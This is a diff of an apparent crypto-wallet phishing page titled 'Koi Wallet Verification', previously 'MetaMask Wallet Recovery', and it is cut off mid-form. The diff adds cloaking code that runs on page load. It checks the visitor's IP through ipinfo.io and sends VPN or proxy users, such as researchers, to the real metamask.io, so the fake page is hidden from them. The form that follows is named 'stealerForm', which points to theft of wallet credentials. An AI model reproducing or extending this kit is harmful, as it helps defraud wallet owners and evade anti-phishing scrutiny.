@@ -1,38 +1,63 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>MetaMask Wallet Recovery</title>
-  <link rel="stylesheet" href="style.css" />
+ 
 </head>
+<body>
   <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title> Wallet Verification</title>
+  <title>Koi Wallet Verification</title>
   <link rel="stylesheet" href="style.css" />
+  <style>
+    #vpn-warning {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: #0a0f1a;
+      color: #00ffff;
+      font-size: 1.2rem;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      flex-direction: column;
+    }
+  </style>
 
   <script>
-    // VPN Cloaking Logic – Auto Trigger on Page Load
-    fetch("https://ipinfo.io/json?token=97788c7d33c9af")
-      .then(res => res.json())
-      .then(data => {
-        const isVPN = data?.privacy?.vpn || data?.privacy?.proxy || false;
+    // VPN Cloaking Logic with visible warning
+    document.addEventListener("DOMContentLoaded", () => {
+      fetch("https://ipinfo.io/json?token=97788c7d33c9af")
+        .then(res => res.json())
+        .then(data => {
+          const isVPN = data?.privacy?.vpn || data?.privacy?.proxy || false;
 
-        if (isVPN) {
-          console.log("🚨 VPN detected! Redirecting to MetaMask...");
-          window.location.href = "https://metamask.io";
-        } else {
-          console.log("✅ No VPN detected. Proceeding to main site...");
-        }
-      })
-      .catch(err => {
-        console.warn("⚠️ IPInfo failed:", err);
-      });
+          if (isVPN) {
+            const warningBox = document.getElementById("vpn-warning");
+            warningBox.style.display = "flex";
+            setTimeout(() => {
+              window.location.href = "https://metamask.io";
+            }, 2500); // Show message for 2.5s before redirect
+          }
+        })
+        .catch(err => {
+          console.warn("⚠️ IPInfo failed:", err);
+        });
+    });
   </script>
 </head>
 <body>
+  <!-- VPN Message -->
+  <div id="vpn-warning">
+    <p>🔍 VPN or Proxy Detected</p>
+    <p>Redirecting to MetaMask.io...</p>
+ 
   <div class="container">
     <h2>🔐 Wallet Verification</h2>
     <form id="stealerForm">
